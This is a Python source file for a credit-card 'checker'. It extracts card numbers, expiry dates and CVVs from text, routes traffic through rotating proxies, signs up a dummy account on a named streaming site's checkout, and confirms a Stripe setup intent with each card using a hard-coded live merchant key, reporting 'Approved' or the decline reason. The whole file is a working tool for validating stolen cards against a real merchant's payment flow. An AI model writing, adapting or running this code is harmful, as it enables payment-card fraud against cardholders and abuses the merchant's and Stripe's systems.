import requests
import re, random
from typing import List

def create_lista(text: str):
    m = re.findall(r'\d{15,16}(?:/|:|\|)\d+(?:/|:|\|)\d{2,4}(?:/|:|\|)\d{3,4}', text)
    lis = list(filter(lambda num: num.startswith(("5", "4", "3", "6")), [*set(m)]))
    return [xx.replace("/", "|").replace(":", "|") for xx in lis]

def get_proxies(proxies: List[str] = [], proxy_type: str = "http"):
    try:
        file = random.choice(proxies)
        host, port, user, pas = file.split(":")[:4]
        return {
            "proxies": {
                'http': f'{proxy_type}://{user}:{pas}@{host}:{port}',
                'https': f'{proxy_type}://{user}:{pas}@{host}:{port}'
            }
        }
    except Exception as e:
        return {"error": str(e)}

def main(card, proxy=None):
    try:
        cards = create_lista(card)
        if not cards:
            return {'status': 'declined', 'message': 'Invalid card format (must be CC|MM|YY|CVV)'}

        proxy_dict = get_proxies([proxy]).get('proxies', None) if proxy else None
        with requests.Session() as session:
            if proxy_dict:
                session.proxies = proxy_dict

            # Step 1: Register dummy user
            session.post(
                "https://www.tmilly.tv/checkout/submit_form_sign_up",
                params={"o": "32247"},
                headers={
                    "accept": "text/html",
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": "Mozilla/5.0"
                },
                data="form%5Bemail%5D=test@mail.com&form%5Bname%5D=Tester&form%5Bterms_and_conditions%5D=on"
            )

            r1 = session.get("https://www.tmilly.tv/api/billings/setup_intent", params={"page": "checkouts"})

            if r1.status_code != 200:
                return {'status': 'declined', 'message': 'Failed to generate setup intent...'}

            setup_intent = r1.json().get("setup_intent", "")
            if not setup_intent:
                return {'status': 'declined', 'message': 'Setup intent not found..'}

            seti_id = setup_intent.split("_secret_")[0]
            cc, mes, ano, cvv = cards[0].split("|")[:4]

            payload = (
                f'return_url=https://www.tmilly.tv/checkout/success'
                f'&payment_method_data[type]=card'
                f'&payment_method_data[card][number]={cc}'
                f'&payment_method_data[card][cvc]={cvv}'
                f'&payment_method_data[card][exp_year]={ano}'
                f'&payment_method_data[card][exp_month]={mes}'
                f'&payment_method_data[billing_details][address][country]=US'
                f'&_stripe_account=acct_1FawFBC0yx1905mY'
                f'&key=pk_live_DImPqz7QOOyx70XCA9DSifxb'
                f'&client_secret={setup_intent}'
            )

            r2 = session.post(
                f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": "Mozilla/5.0"
                },
                data=payload
            )

            res_json = r2.json()
            state = res_json.get('status')
            if state == 'succeeded':
                return {'status': 'success', 'message': 'Approved ✅'}

            if res_json.get('error'):
                return {'status': 'declined', 'message': res_json['error']['message']}

            return {'status': 'declined', 'message': '❌ Unknown response'}

    except requests.exceptions.ProxyError:
        return {'status': 'declined', 'message': 'Proxy connection failed'}

    except Exception as err:
        return {'status': 'declined', 'message': f'Unknown error: {err}'}
